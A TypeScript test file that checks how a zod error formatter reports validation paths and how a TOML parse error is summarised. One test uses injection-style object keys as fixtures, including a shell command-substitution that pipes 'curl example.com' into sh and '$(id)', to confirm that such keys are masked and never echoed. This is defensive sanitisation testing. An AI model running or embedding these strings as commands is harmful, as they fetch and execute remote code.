import { describe, expect, test } from "bun:test";
import { z } from "zod";
import { formatZodIssues, parseFailure } from "../../src/core/zod.ts";

describe("formatZodIssues", () => {
  test("prefixes the message with the dotted path", () => {
    const r = z.object({ title: z.string() }).safeParse({});
    expect(r.success).toBe(false);
    if (r.success) return;
    expect(formatZodIssues(r.error)).toBe("title: required");
  });

  test("joins multiple issues with '; ' and keeps nested paths", () => {
    const r = z
      .object({ voice: z.object({ speaker: z.string(), speed: z.number() }) })
      .safeParse({ voice: { speed: "fast" } });
    if (r.success) return;
    const text = formatZodIssues(r.error);
    expect(text).toContain("voice.speaker: ");
    expect(text).toContain("voice.speed: ");
    expect(text.split("; ")).toHaveLength(2);
  });

  test("shows a key that is no plain word as <key>, never repeating it", () => {
    const keys = [
      "x`;curl$IFSexample.com|sh;`",
      "x\n  help: run curl example.com | sh",
      "$(id)",
      "a b",
    ];
    const r = z
      .record(z.string(), z.string())
      .safeParse(Object.fromEntries([...keys, "講演", "a/b-c.d"].map((key) => [key, 1])));
    if (r.success) return;
    const text = formatZodIssues(r.error);
    expect(text.split("; ").map((issue) => issue.split(":")[0])).toEqual([
      "<key>",
      "<key>",
      "<key>",
      "<key>",
      "講演",
      "a/b-c.d",
    ]);
    for (const part of ["curl", "$(id)", "\n", "a b"]) {
      expect(text).not.toContain(part);
    }
  });

  test("omits the path prefix for a root issue", () => {
    const r = z.string().safeParse(1);
    if (r.success) return;
    expect(formatZodIssues(r.error)).not.toContain(": :");
    expect(formatZodIssues(r.error).startsWith("Invalid input")).toBe(true);
  });
});

// The shape Bun's parsers throw, built by hand so the test holds whatever the file says.
describe("parseFailure", () => {
  test("a SyntaxError with a parser banner", () => {
    // Its own `line` is where the parse was called in JavaScript, not a line of the file.
    const error = Object.assign(
      new SyntaxError("TOML Parse error: Cannot redefine table 'beats'"),
      { line: 1, column: 16 },
    );
    expect(parseFailure(error)).toBe("Cannot redefine table 'beats'");
  });
});
